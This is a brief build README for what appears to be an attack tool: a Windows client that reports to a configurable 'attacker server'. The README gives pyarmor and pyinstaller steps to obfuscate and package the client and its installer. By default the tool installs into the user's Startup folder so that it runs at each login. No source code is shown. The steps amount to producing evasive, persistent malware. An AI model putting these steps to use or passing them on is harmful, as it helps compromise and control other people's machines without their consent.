Build instructions (Windows only atm):

You will need pyarmor and pyinstaller.
Adjust in client.py the attacker server, otherwise you will need to specify it as argument.
Create .env file with SERVER="" (Optional)

--Obfuscate the client--
1- pyarmor gen .\client.py

--"Compiles" client--
2- pyinstaller .\client.spec

--Obfuscate the installer--
3- pyarmor gen .\utils\install.py

--"Compiles" install--
4- pyinstaller .\install.spec

The default installation path is C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
